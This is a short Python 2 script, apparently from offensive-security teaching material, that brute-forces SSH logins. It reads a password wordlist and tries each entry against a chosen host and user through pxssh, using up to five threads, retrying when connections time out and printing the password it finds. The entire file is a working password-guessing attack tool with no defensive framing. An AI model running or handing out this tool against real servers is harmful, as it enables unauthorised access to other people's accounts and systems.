import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def send_command(s, cmd):
	s.sendline(cmd)
	s.prompt()
	return s.before

def connect(host, user, password, release):
	global Found
	global Fails

	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password found: ' + password
		Found = True
		return s
	except Exception, e:
		if 'read_nonblocking' in str(e):														# ssh server connections maxed out
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif 'synchronize with original prompt' in str(e):										# pxssh needs a second
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		if release: connection_lock.release()

def main():

	parser = optparse.OptionParser('%prog -H <target host> -u <user> -F <password list>')

	parser.add_option('-H', dest='tgtHost', 	type='string', help='specify target host')
	parser.add_option('-F', dest='passwdFile', 	type='string', help='specify password file')
	parser.add_option('-u', dest='user', 		type='string', help='specify the user')

	(options, args) = parser.parse_args()

	host = options.tgtHost
	passwdFile = options.passwdFile
	user = options.user

	if host == None or passwdFile == None or user == None:
		print parser.usage
		exit(0)

	pfileReader = open(passwdFile, 'r')
	for line in pfileReader.readlines():
		if Found:
			print "[*] Exiting: Password found"
			exit(0)
		if Fails > 5:
			print "[!] Exiting: Too many socket timeouts"
			exit(0)
		connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print "[-] Testing " + str(password)
		t = Thread(target=connect, args=(host, user, password, True))
		child = t.start()

if __name__ == "__main__":
	main()